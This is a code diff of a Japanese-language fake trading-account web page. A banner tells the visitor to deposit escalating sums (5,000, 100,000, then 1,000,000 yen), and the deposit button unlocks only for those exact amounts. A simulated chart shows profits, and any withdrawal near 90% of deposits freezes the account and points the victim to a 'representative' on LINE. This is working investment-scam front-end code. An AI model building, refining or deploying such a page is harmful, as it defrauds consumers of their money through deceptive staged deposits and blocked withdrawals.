@@ -114,9 +114,21 @@
         .input-group button:hover:enabled {
             background-color: #004d40;
         }
+        #instructions {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: #00796b;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            font-size: 22px; /* Increase instruction font size */
+            z-index: 1000; /* Ensure it appears on top */
+        }
     </style>
 </head>
 <body>
+    <div id="instructions">口座に5000円入金してください。</div>
     <div id="page1" class="container active">
         <h1>チャート</h1>
         <div id="chartContainer">
@@ -127,8 +139,8 @@
         <h1>口座</h1>
         <div class="input-group">
             <label for="amount">金額を入力してください:</label>
-            <input type="number" id="amount" step="1.00">
-            <button onclick="confirmDeposit()" id="depositBtn">入金</button>
+            <input type="number" id="amount" step="1.00" oninput="validateDeposit()">
+            <button onclick="confirmDeposit()" id="depositBtn" disabled>入金</button>
         </div>
         <div id="account">
             <p>口座残高: <span id="balance">0.00</span> 円</p>
@@ -138,7 +150,7 @@
         <div class="input-group">
             <label for="withdrawAmount">出金額を入力してください:</label>
             <input type="number" id="withdrawAmount" step="0.01">
-            <button onclick="confirmWithdraw()" id="withdrawBtn">出金</button>
+            <button onclick="confirmWithdraw()" id="withdrawBtn" disabled>出金</button>
         </div>
     </div>
     <div id="freezeMessage">口座が凍結しました。担当者にLINEにてご連絡ください。</div>
@@ -147,7 +159,6 @@
         <button onclick="showPage('page2')">口座</button>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script>
         let balance = 0;
         let totalDeposit = 0;
@@ -155,17 +166,16 @@
         let chart;
         let chartData = [];
         let chartLabels = [];
+        let currentStep = 0;
+
         const instructions = [
             "口座に5000円入金してください。",
             "口座から好きな金額を出金してください。",
-            "次は、100000円入金してください。",
+            "次は、100000円入金してください",
             "口座から好きな金額を出金してください。",
-            "次は、1000000円入金してください。",
+            "次は、1000000円入金してください",
             "口座から好きな金額を出金してください。"
         ];
-        let instructionIndex = 0;
-        let allowedDeposit = 5000;
-        let allowedWithdraw = false;
 
         function showPage(pageId) {
             const pages = document.querySelectorAll('.container');
@@ -173,9 +183,24 @@
             document.getElementById(pageId).classList.add('active');
         }
 
-        function displayInstruction() {
-            const message = instructions[instructionIndex];
-            alert(message);
+        function updateInstructions() {
+            document.getElementById('instructions').innerText = instructions[currentStep];
+        }
+
+        function validateDeposit() {
+            const amountInput = document.getElementById('amount');
+            const amount = parseFloat(amountInput.value);
+            const depositBtn = document.getElementById('depositBtn');
+            
+            if (currentStep === 0 && amount === 5000) {
+                depositBtn.disabled = false;
+            } else if (currentStep === 2 && amount === 100000) {
+                depositBtn.disabled = false;
+            } else if (currentStep === 4 && amount === 1000000) {
+                depositBtn.disabled = false;
+            } else {
+                depositBtn.disabled = true;
+            }
         }
 
         function confirmDeposit() {
@@ -183,11 +208,6 @@
             const amount = parseFloat(amountInput.value);
             if (isNaN(amount) || amount <= 0) {
                 alert('有効な金額を入力してください');
-                return;
-            }
-
-            if (amount !== allowedDeposit) {
-                alert(`指定された金額(${allowedDeposit}円)を入金してください`);
                 return;
             }
 
@@ -206,16 +226,6 @@
             showPage('page1');
             disableButtons();
             startChart(amount);
-
-            if (instructionIndex % 2 === 0) {
-                setTimeout(() => {
-                    instructionIndex++;
-                    allowedDeposit = instructionIndex === 2 ? 100000 : 1000000;
-                    allowedWithdraw = false;
-                    enableButtons();
-                    displayInstruction();
-                }, 12000);
-            }
         }
 
         function confirmWithdraw() {
@@ -226,17 +236,9 @@
                 return;
             }
 
-            if (!allowedWithdraw) {
-                alert('出金は許可されていません');
-                return;
-            }
-
-            if (totalWithdraw + amount >= totalDeposit * 0.9 && totalDeposit < 1000000) {
+            if (totalWithdraw + amount >= totalDeposit * 0.9 && totalDeposit <= 1000000) {
                 freezeAccount();
-                return;
-            }
-
-            if (confirm(`本当に${amount}円を出金しますか？`)) {
+            } else if (confirm(`本当に${amount}円を出金しますか？`)) {
                 withdraw();
             }
         }
@@ -248,15 +250,12 @@
             totalWithdraw += amount;
             updateBalance();
             withdrawInput.value = ''; // Reset input field
-
-            if (instructionIndex % 2 !== 0) {
-                setTimeout(() => {
-                    instructionIndex++;
-                    allowedWithdraw = false;
-                    enableButtons();
-                    displayInstruction();
-                }, 2000);
-            }
+            
+            setTimeout(() => {
+                currentStep++;
+                updateInstructions();
+                enableButtons();
+            }, 2000);
         }
 
         function freezeAccount() {
@@ -277,8 +276,11 @@
         }
 
         function enableButtons() {
-            document.getElementById('depositBtn').disabled = false;
-            document.getElementById('withdrawBtn').disabled = false;
+            if (currentStep % 2 === 0) {
+                document.getElementById('depositBtn').disabled = false;
+            } else {
+                document.getElementById('withdrawBtn').disabled = false;
+            }
         }
 
         function startChart(depositAmount) {
@@ -367,7 +369,11 @@
                     clearInterval(intervalId);
                     balance = chartData[steps];
                     updateBalance();
-                    enableButtons();
+                    setTimeout(() => {
+                        currentStep++;
+                        updateInstructions();
+                        enableButtons();
+                    }, 12000);
                 } else {
                     chart.data.labels.push(chartLabels[step]);
                     chart.data.datasets[0].data.push(chartData[step]);
@@ -380,7 +386,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             showPage('page1');
             initializeChart(); // Initialize chart when the page loads
-            displayInstruction(); // Display the initial instruction
+            updateInstructions();
         });
 
         function initializeChart() {
@@ -425,5 +431,6 @@
             });
         }
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </body>
 </html>
